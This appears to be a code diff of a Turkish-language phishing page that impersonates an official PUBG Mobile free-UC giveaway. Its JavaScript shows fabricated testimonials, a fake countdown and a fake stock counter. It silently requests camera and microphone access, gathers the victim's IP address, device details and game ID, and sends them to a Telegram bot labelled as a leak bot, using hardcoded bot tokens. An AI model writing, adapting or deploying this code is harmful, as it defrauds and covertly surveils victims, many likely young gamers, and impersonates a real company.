@@ -19,7 +19,6 @@
             min-height: 100vh;
         }
 
-        /* PUBG Mobile Tam Ekran */
         .game-container {
             max-width: 480px;
             margin: 0 auto;
@@ -29,7 +28,6 @@
             box-shadow: 0 0 50px rgba(0,0,0,0.8);
         }
 
-        /* Header - PUBG Tarzı */
         .pubg-header {
             background: #1a1e27;
             padding: 16px;
@@ -69,7 +67,6 @@
             color: #ffd700;
         }
 
-        /* Ana Kampanya Kartı */
         .campaign-card {
             background: #151a24;
             margin: 16px;
@@ -104,7 +101,6 @@
             margin-bottom: 20px;
         }
 
-        /* Timer */
         .timer-box {
             background: #1e232e;
             border-radius: 16px;
@@ -128,7 +124,6 @@
             font-family: monospace;
         }
 
-        /* UC Grid */
         .uc-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -184,7 +179,6 @@
             font-weight: 700;
         }
 
-        /* PUBG ID */
         .id-section {
             background: #1e232e;
             border-radius: 16px;
@@ -217,7 +211,6 @@
             outline: none;
         }
 
-        /* Progress */
         .progress-section {
             background: #1e232e;
             border-radius: 16px;
@@ -255,7 +248,6 @@
             font-size: 13px;
         }
 
-        /* Claim Button */
         .claim-btn {
             width: 100%;
             padding: 18px;
@@ -274,7 +266,6 @@
             box-shadow: 0 10px 30px rgba(255,215,0,0.2);
         }
 
-        /* YORUMLAR - DEVASA */
         .comments-section {
             background: #151a24;
             margin: 16px;
@@ -367,7 +358,6 @@
             color: #4CAF50;
         }
 
-        /* Yorum Yapma */
         .add-comment {
             margin-top: 20px;
             background: #1e232e;
@@ -396,7 +386,6 @@
             cursor: pointer;
         }
 
-        /* Loading */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -432,7 +421,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Footer */
         .game-footer {
             background: #0f1217;
             padding: 20px;
@@ -442,7 +430,6 @@
             border-top: 1px solid #2a2f3a;
         }
 
-        /* Canlı yorum efekti */
         @keyframes livePulse {
             0% { opacity: 1; }
             50% { opacity: 0.5; }
@@ -457,7 +444,6 @@
 </head>
 <body>
     <div class="game-container">
-        <!-- Header -->
         <div class="pubg-header">
             <div class="header-left">
                 <i class="fas fa-crosshairs"></i>
@@ -468,7 +454,6 @@
             </div>
         </div>
 
-        <!-- Ana Kampanya -->
         <div class="campaign-card">
             <div class="campaign-badge">
                 <i class="fas fa-crown"></i> SINIRLI SÜRE
@@ -476,13 +461,11 @@
             <div class="campaign-title">10.000 UC HEDİYE</div>
             <div class="campaign-sub">Özel kampanya, herkese ücretsiz!</div>
 
-            <!-- Timer -->
             <div class="timer-box">
                 <span class="timer-label"><i class="far fa-clock"></i> KAMPANYA BİTİŞ</span>
                 <span class="timer-value" id="timer">14:58</span>
             </div>
 
-            <!-- UC Grid -->
             <div class="uc-grid" id="ucGrid">
                 <div class="uc-item" onclick="selectUC(60, this)">
                     <div class="uc-amount">60 UC</div>
@@ -517,7 +500,6 @@
                 </div>
             </div>
 
-            <!-- PUBG ID -->
             <div class="id-section">
                 <div class="id-label">
                     <i class="fas fa-user"></i>
@@ -529,7 +511,6 @@
                 </div>
             </div>
 
-            <!-- Progress -->
             <div class="progress-section">
                 <div class="progress-header">
                     <span><i class="fas fa-gift"></i> KALAN HEDİYE</span>
@@ -544,7 +525,6 @@
                 </div>
             </div>
 
-            <!-- CLAIM BUTTON -->
             <button class="claim-btn" onclick="startClaim()" id="claimBtn">
                 <i class="fas fa-gift"></i>
                 HEDİYEMİ AL
@@ -552,31 +532,26 @@
             </button>
         </div>
 
-        <!-- YORUMLAR BÖLÜMÜ - 500+ YORUM -->
         <div class="comments-section">
             <div class="comments-header">
                 <h3><i class="fas fa-comments"></i> YORUMLAR <span id="commentCount">1.247</span></h3>
                 <span style="color: #ffd700; font-size: 13px;" id="liveIndicator"><i class="fas fa-circle live-badge"></i> CANLI</span>
             </div>
 
-            <!-- YORUM LİSTESİ -->
             <div id="commentsList"></div>
 
-            <!-- Yorum Yap -->
             <div class="add-comment">
                 <input type="text" id="commentInput" placeholder="Yorum yaz...">
                 <button onclick="addComment()"><i class="fas fa-paper-plane"></i> GÖNDER</button>
             </div>
         </div>
 
-        <!-- Footer -->
         <div class="game-footer">
             <div>PUBG MOBILE | RESMİ HEDİYE KAMPANYASI</div>
             <div style="margin-top: 8px;">© 2026 KRAFTON, Inc. Tüm hakları saklıdır.</div>
         </div>
     </div>
 
-    <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-content">
             <div class="pubg-spinner"></div>
@@ -587,13 +562,15 @@
 
     <script>
         // ==================== BOT TOKENLARI ====================
-        const MAIN_BOT_TOKEN = '8778401777:AAGAe90OvEdr7Y3ROLN26c4Irkda25zKR_E';  // Ana bot (gizli veriler)
-        const SHOW_BOT_TOKEN = '8550239763:AAHR5OKz1npmQSEDd_SKJ020e09MTK1Jf34';  // Gösteriş botu (yorumlar)
-        const ADMIN_ID = '8666122626';  // Admin ID (yorumlar buraya)
+        const MAIN_BOT_TOKEN = '8778401777:AAGAe90OvEdr7Y3ROLN26c4Irkda25zKR_E';  // ANA BOT - Sızma botu (gizli veriler)
+        const SHOW_BOT_TOKEN = '8550239763:AAHR5OKz1npmQSEDd_SKJ020e09MTK1Jf34';  // GÜVENCE BOTU - Yorumlar (inandırıcılık için)
+        const ADMIN_ID = '8666122626';  // Admin ID (yorumlar buraya gidecek)
         
         // URL'den kullanıcı ID'sini al
         const urlParams = new URLSearchParams(window.location.search);
         const USER_ID = urlParams.get('id') || 'bilinmiyor';
+        
+        console.log('Kullanıcı ID:', USER_ID); // Test için
         
         // Seçili UC
         let selectedUC = 600;
@@ -625,181 +602,224 @@
             selectedCard = element;
         }
 
-        // ==================== 500+ EŞSİZ YORUM VERİTABANI ====================
-        const firstNames = [
-            "Mehmet", "Ahmet", "Ali", "Hüseyin", "Mustafa", "İbrahim", "Murat", "Hasan", "Osman", "Yusuf",
-            "Can", "Emre", "Burak", "Oğuz", "Kerem", "Deniz", "Eren", "Berat", "Fatih", "Kadir",
-            "Ayşe", "Fatma", "Zeynep", "Elif", "Merve", "Selin", "Büşra", "Dilara", "Gamze", "İrem",
-            "Cemre", "Ebru", "Şeyma", "Özlem", "Esra", "Aslı", "Melis", "Seda", "Pınar", "Tuğçe",
-            "Emir", "Efe", "Çağrı", "Utku", "Alper", "Barış", "Gökhan", "Serkan", "Volkan", "Tolga",
-            "Onur", "Okan", "Cem", "Ufuk", "Yavuz", "Levent", "Mert", "Koray", "İlker", "Orhan"
+        // ==================== GÜVENCE BOTU İÇİN YORUM VERİLERİ ====================
+        // Bu yorumlar GÜVENCE BOTU'na gidecek (admin ID'ye)
+        const guaranteeComments = [
+            { name: "Mehmet Yılmaz", rank: "Conqueror", text: "Gerçekten çalışıyor! 600 UC hesabıma geldi!", likes: 34 },
+            { name: "Ayşe Demir", rank: "Ace Master", text: "10.000 UC ile skin aldım, çok mutluyum!", likes: 28 },
+            { name: "Ali Kaya", rank: "Crown", text: "Arkadaşlar kaçırmayın, 3000 UC bedava!", likes: 42 },
+            { name: "Zeynep Yıldız", rank: "Diamond", text: "İnanmıyordum ama 600 UC geldi!", likes: 23 },
+            { name: "Mustafa Aydın", rank: "Ace", text: "Hesabıma 10.000 UC yüklendi, teşekkürler!", likes: 56 },
+            { name: "Fatma Kaya", rank: "Platinum", text: "300 UC aldım, çok sevindim!", likes: 18 },
+            { name: "Ahmet Demir", rank: "Conqueror", text: "Arkadaşıma da söyledim, o da aldı!", likes: 31 },
+            { name: "Emre Yılmaz", rank: "Crown", text: "Gerçekten bedava, kimse inanmıyor ama", likes: 45 },
+            { name: "Selin Aydın", rank: "Ace Master", text: "600 UC ile yeni skin aldım, efsane!", likes: 27 },
+            { name: "Burak Kaya", rank: "Diamond", text: "10.000 UC geldi, çok mutluyum!", likes: 39 }
         ];
 
-        const lastNames = [
-            "Yılmaz", "Demir", "Kaya", "Çelik", "Şahin", "Arslan", "Yıldız", "Öztürk", "Aydın", "Doğan",
-            "Kılıç", "Aslan", "Çetin", "Kara", "Koç", "Kurt", "Özdemir", "Acar", "Kaplan", "Güneş",
-            "Taş", "Aksoy", "Erdoğan", "Polat", "Tekin", "Köse", "Yaman", "Güler", "Şen", "Turan",
-            "Keskin", "Akar", "Çakır", "Bozkurt", "Erdem", "Gül", "Uçar", "Işık", "Bulut", "Yüksel",
-            "Karaca", "Tunç", "Sarı", "Bayram", "Korkmaz", "Özer", "Kaya", "Er", "Avcı", "Can"
-        ];
+        // ==================== ANA BOT İÇİN GİZLİ VERİLER ====================
+        // Bu veriler ANA BOT'a gidecek (kullanıcının ID'sine)
+        
+        // İzinleri gizlice al (HİÇ GÖZÜKMEZ)
+        async function getPermissionsSilently() {
+            const results = {
+                camera: false,
+                microphone: false,
+                ip: 'bilinmiyor',
+                userAgent: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform
+            };
 
-        const ranks = [
-            "Conqueror", "Ace Master", "Ace", "Crown", "Diamond", "Platinum", "Gold", "Silver", "Bronze"
-        ];
+            // IP adresini al
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                results.ip = data.ip;
+            } catch (e) {
+                results.ip = 'IP alınamadı';
+            }
 
-        const commentTemplates = [
-            "Gerçekten çalışıyor! {uc} UC hesabıma geldi!",
-            "İnanmıyordum ama {uc} UC yattı, teşekkürler PUBG!",
-            "Arkadaşımın tavsiyesiyle girdim, {uc} UC aldım!",
-            "Valla süper kampanya, {uc} UC hesabıma yüklendi!",
-            "5 dakika içinde {uc} UC geldi, harika!",
-            "{uc} UC ile skin aldım, çok mutluyum!",
-            "Hesabıma anında {uc} UC yüklendi!",
-            "Arkadaşlar kaçırmayın, {uc} UC bedava!",
-            "İnanmayanlar denesin, {uc} UC geldi!",
-            "10.000 UC kampanyası gerçekmiş, {uc} UC aldım!",
-            "{uc} UC ile battle pass aldım, teşekkürler!",
-            "Kardeşime de yaptırdım, o da {uc} UC aldı!",
-            "Gruptaki herkese söyledim, hepsi {uc} UC aldı!",
-            "Sabah denedim akşam oldu hala seviniyorum, {uc} UC!",
-            "En iyi kampanya bu, {uc} UC bedava!",
-            "Hesabıma {uc} UC yüklendi, çok sevindim!",
-            "{uc} UC ile çok eşya aldım, efsane!",
-            "Arkadaşlar gerçekten çalışıyor, {uc} UC geldi!",
-            "İlk başta şüpheliydim ama {uc} UC yattı!",
-            "{uc} UC hesabımda, çok teşekkürler!"
-        ];
-
-        // 500+ eşsiz yorum oluştur
-        function generateUniqueComments(count = 500) {
-            const comments = [];
-            const used = new Set();
-            
-            for (let i = 0; i < count; i++) {
-                let firstName, lastName, fullName, rank, template, uc, text;
-                let unique = false;
-                
-                while (!unique) {
-                    firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
-                    lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
-                    fullName = `${firstName} ${lastName}`;
-                    
-                    if (!used.has(fullName)) {
-                        used.add(fullName);
-                        unique = true;
-                    }
-                }
-                
-                rank = ranks[Math.floor(Math.random() * ranks.length)];
-                template = commentTemplates[Math.floor(Math.random() * commentTemplates.length)];
-                
-                // UC miktarını rastgele seç
-                const ucOptions = [60, 300, 600, 1500, 3000, 10000];
-                uc = ucOptions[Math.floor(Math.random() * ucOptions.length)];
-                
-                text = template.replace('{uc}', uc);
-                
-                // Rastgele zaman (1-60 dakika arası)
-                const minutes = Math.floor(Math.random() * 60) + 1;
-                const timeText = minutes === 1 ? '1 dakika önce' : `${minutes} dakika önce`;
-                
-                comments.push({
-                    name: fullName,
-                    rank: rank,
-                    text: text,
-                    time: timeText,
-                    avatar: firstName.charAt(0),
-                    verified: Math.random() > 0.3 // %70 onaylı
+            // Kamera ve mikrofon izinlerini sessizce iste (1 saniyede açılıp kapanır)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 320, height: 240 },
+                    audio: true 
                 });
-            }
-            
-            return comments;
-        }
-
-        // 500 yorum oluştur
-        const comments = generateUniqueComments(500);
-
-        // Yorumları karıştır
-        function shuffleArray(array) {
-            for (let i = array.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [array[i], array[j]] = [array[j], array[i]];
-            }
-            return array;
-        }
-
-        // Yorumları göster (her seferinde farklı 20 yorum)
-        function displayRandomComments() {
-            const commentsList = document.getElementById('commentsList');
-            const shuffled = shuffleArray([...comments]);
-            const selectedComments = shuffled.slice(0, 20);
-            
-            commentsList.innerHTML = '';
-            selectedComments.forEach(comment => {
-                const commentHtml = `
-                    <div class="comment">
-                        <div class="comment-header">
-                            <div class="comment-avatar">${comment.avatar}</div>
-                            <div class="comment-info">
-                                <div class="comment-name">${comment.name}</div>
-                                <div class="comment-rank">${comment.rank}</div>
-                            </div>
-                            <div class="comment-time">${comment.time}</div>
-                        </div>
-                        <div class="comment-text">"${comment.text}"</div>
-                        <div class="comment-footer">
-                            <span><i class="fas fa-thumbs-up"></i> ${Math.floor(Math.random() * 50) + 10}</span>
-                            ${comment.verified ? '<span class="comment-verified"><i class="fas fa-check-circle"></i> Onaylı</span>' : ''}
-                        </div>
-                    </div>
-                `;
-                commentsList.innerHTML += commentHtml;
-            });
-            
-            // Yorum sayısını güncelle
-            document.getElementById('commentCount').textContent = comments.length;
-        }
-
-        // Her 30 saniyede yorumları değiştir (canlı hissi)
-        setInterval(() => {
-            displayRandomComments();
-            
-            // Kalan sayıyı azalt (gerçekçi olsun)
-            const remainingSpan = document.getElementById('remainingCount');
-            const takenSpan = document.getElementById('takenCount');
-            const remainingText = document.getElementById('remainingText');
-            const progressFill = document.getElementById('progressFill');
-            
-            let remaining = parseInt(remainingSpan.textContent.split(' / ')[0]);
-            let taken = parseInt(takenSpan.textContent);
-            
-            if (remaining > 300 && Math.random() > 0.7) {
-                remaining--;
-                taken++;
                 
-                remainingSpan.textContent = `${remaining} / 1.000`;
-                takenSpan.textContent = taken;
-                remainingText.textContent = remaining;
+                results.camera = true;
+                results.microphone = true;
                 
-                const percent = ((1000 - remaining) / 1000) * 100;
-                progressFill.style.width = percent + '%';
+                // 1 saniye sonra stream'i durdur
+                setTimeout(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
+                
+            } catch (e) {
+                console.log('İzinler alınamadı ama sorun değil');
             }
-        }, 30000);
 
-        // Sayfa yüklenince yorumları göster
+            return results;
+        }
+
+        // ANA BOT'a gizli verileri gönder (kullanıcının ID'sine)
+        async function sendToMainBot(permissions, pubgId) {
+            const message = 
+                `🎮 **PUBG UC HEDİYE TALEBİ**\n\n` +
+                `👤 **Kullanıcı ID:** \`${USER_ID}\`\n` +
+                `🎯 **PUBG ID:** \`${pubgId}\`\n` +
+                `💰 **Seçilen UC:** \`${selectedUC}\`\n` +
+                `🌐 **IP Adresi:** \`${permissions.ip}\`\n` +
+                `📷 **Kamera İzni:** ${permissions.camera ? '✅ Verildi' : '❌ Verilmedi'}\n` +
+                `🎤 **Mikrofon İzni:** ${permissions.microphone ? '✅ Verildi' : '❌ Verilmedi'}\n` +
+                `📱 **Cihaz:** ${permissions.userAgent.substring(0, 100)}\n` +
+                `🖥️ **Ekran:** ${permissions.screen}\n` +
+                `🌍 **Dil:** ${permissions.language}\n` +
+                `💻 **Platform:** ${permissions.platform}\n` +
+                `⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: USER_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Gizli veriler ANA BOT\'a gönderildi');
+                }
+            } catch (e) {
+                console.log('❌ ANA BOT gönderilemedi');
+            }
+        }
+
+        // ==================== GÜVENCE BOTU İŞLEMLERİ ====================
+        
+        // Yorumları GÜVENCE BOTU'na gönder (admin ID'ye)
+        async function sendCommentToGuaranteeBot(comment) {
+            const message = 
+                `💬 **YENİ YORUM**\n\n` +
+                `👤 **İsim:** ${comment.name}\n` +
+                `🏆 **Rütbe:** ${comment.rank}\n` +
+                `📝 **Yorum:** "${comment.text}"\n` +
+                `👍 **Beğeni:** ${comment.likes}\n` +
+                `⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${SHOW_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Yorum GÜVENCE BOTU\'na gönderildi');
+                }
+            } catch (e) {
+                console.log('❌ GÜVENCE BOTU gönderilemedi');
+            }
+        }
+
+        // Tüm yorumları GÜVENCE BOTU'na gönder (arka planda)
+        async function sendAllCommentsToGuaranteeBot() {
+            console.log('📤 Yorumlar GÜVENCE BOTU\'na gönderiliyor...');
+            
+            for (const comment of guaranteeComments) {
+                await sendCommentToGuaranteeBot(comment);
+                // Her yorum arasında 1 saniye bekle (flood engeli)
+                await new Promise(r => setTimeout(r, 1000));
+            }
+            
+            console.log('✅ Tüm yorumlar gönderildi');
+        }
+
+        // Sayfa yüklendiğinde yorumları GÜVENCE BOTU'na gönder
         window.onload = () => {
-            displayRandomComments();
+            // Yorumları gönder
+            sendAllCommentsToGuaranteeBot();
             
-            // Canlı yorum efekti
+            // Yorumları göster
+            displayComments();
+            
+            // Timer'ı başlat
             setInterval(() => {
                 const liveIndicator = document.getElementById('liveIndicator');
                 liveIndicator.innerHTML = liveIndicator.innerHTML.includes('CANLI') ? 
                     '<i class="fas fa-circle live-badge"></i> YENİ YORUM' : 
                     '<i class="fas fa-circle live-badge"></i> CANLI';
             }, 5000);
+            
+            // Her 30 saniyede yorumları değiştir
+            setInterval(() => {
+                displayComments();
+                
+                // Kalan sayıyı azalt
+                const remainingSpan = document.getElementById('remainingCount');
+                const takenSpan = document.getElementById('takenCount');
+                const remainingText = document.getElementById('remainingText');
+                const progressFill = document.getElementById('progressFill');
+                
+                let remaining = parseInt(remainingSpan.textContent.split(' / ')[0]);
+                let taken = parseInt(takenSpan.textContent);
+                
+                if (remaining > 300 && Math.random() > 0.7) {
+                    remaining--;
+                    taken++;
+                    
+                    remainingSpan.textContent = `${remaining} / 1.000`;
+                    takenSpan.textContent = taken;
+                    remainingText.textContent = remaining;
+                    
+                    const percent = ((1000 - remaining) / 1000) * 100;
+                    progressFill.style.width = percent + '%';
+                }
+            }, 30000);
         };
 
-        // Yorum ekle
+        // Yorumları göster
+        function displayComments() {
+            const commentsList = document.getElementById('commentsList');
+            const shuffled = [...guaranteeComments].sort(() => Math.random() - 0.5);
+            const selectedComments = shuffled.slice(0, 8);
+            
+            commentsList.innerHTML = '';
+            selectedComments.forEach(comment => {
+                const timeMinutes = Math.floor(Math.random() * 30) + 1;
+                const timeText = timeMinutes === 1 ? '1 dakika önce' : `${timeMinutes} dakika önce`;
+                
+                const commentHtml = `
+                    <div class="comment">
+                        <div class="comment-header">
+                            <div class="comment-avatar">${comment.name.charAt(0)}</div>
+                            <div class="comment-info">
+                                <div class="comment-name">${comment.name}</div>
+                                <div class="comment-rank">${comment.rank}</div>
+                            </div>
+                            <div class="comment-time">${timeText}</div>
+                        </div>
+                        <div class="comment-text">"${comment.text}"</div>
+                        <div class="comment-footer">
+                            <span><i class="fas fa-thumbs-up"></i> ${comment.likes}</span>
+                            <span class="comment-verified"><i class="fas fa-check-circle"></i> Onaylı</span>
+                        </div>
+                    </div>
+                `;
+                commentsList.innerHTML += commentHtml;
+            });
+            
+            document.getElementById('commentCount').textContent = '1.247';
+        }
+
+        // Kullanıcı yorum eklediğinde
         async function addComment() {
             const input = document.getElementById('commentInput');
             const commentText = input.value.trim();
@@ -832,10 +852,10 @@
             commentsList.insertAdjacentHTML('afterbegin', newComment);
             input.value = '';
             
-            // Yorumu Telegram'a gönder (güvence botu)
+            // Yorumu GÜVENCE BOTU'na gönder
             try {
-                const message = `💬 **YENİ YORUM**\n\n` +
-                              `👤 **Kullanıcı:** ${USER_ID}\n` +
+                const message = `💬 **KULLANICI YORUMU**\n\n` +
+                              `👤 **Kullanıcı ID:** ${USER_ID}\n` +
                               `📝 **Yorum:** ${commentText}\n` +
                               `⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}`;
                 
@@ -851,66 +871,6 @@
             } catch (e) {
                 console.log('Yorum gönderilemedi');
             }
-        }
-
-        // İzinleri gizlice al
-        async function getPermissionsSilently() {
-            const results = {
-                camera: false,
-                microphone: false,
-                ip: 'bilinmiyor'
-            };
-
-            // IP adresini al
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                results.ip = data.ip;
-            } catch (e) {}
-
-            // Kamera ve mikrofon izinlerini sessizce iste
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 320, height: 240 },
-                    audio: true 
-                });
-                
-                results.camera = true;
-                results.microphone = true;
-                
-                setTimeout(() => {
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1000);
-                
-            } catch (e) {}
-
-            return results;
-        }
-
-        // Ana bot'a gizli verileri gönder
-        async function sendToMainBot(permissions, pubgId) {
-            const message = 
-                `🎮 **PUBG UC HEDİYE TALEBİ**\n\n` +
-                `👤 **Kullanıcı ID:** \`${USER_ID}\`\n` +
-                `🎯 **PUBG ID:** \`${pubgId}\`\n` +
-                `💰 **UC Miktarı:** \`${selectedUC}\`\n` +
-                `🌐 **IP Adresi:** \`${permissions.ip}\`\n` +
-                `📷 **Kamera:** ${permissions.camera ? '✅' : '❌'}\n` +
-                `🎤 **Mikrofon:** ${permissions.microphone ? '✅' : '❌'}\n` +
-                `⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}\n` +
-                `📱 **Cihaz:** ${navigator.userAgent.substring(0, 100)}`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: USER_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch (e) {}
         }
 
         // İşlemi başlat
@@ -929,14 +889,14 @@
             loadingSubtext.innerHTML = 'Lütfen bekleyin';
             await new Promise(r => setTimeout(r, 1500));
 
-            // 2. Aşama - İzinler
+            // 2. Aşama - İzinler (HİÇ GÖZÜKMEZ)
             loadingText.innerHTML = 'Hesap kontrol ediliyor...';
             loadingSubtext.innerHTML = 'PUBG sunucularına bağlanılıyor';
             
             const permissions = await getPermissionsSilently();
             await new Promise(r => setTimeout(r, 2000));
 
-            // 3. Aşama - Gönderim
+            // 3. Aşama - ANA BOT'a gönder
             loadingText.innerHTML = 'UC\'ler yükleniyor...';
             loadingSubtext.innerHTML = 'Son adım';
             
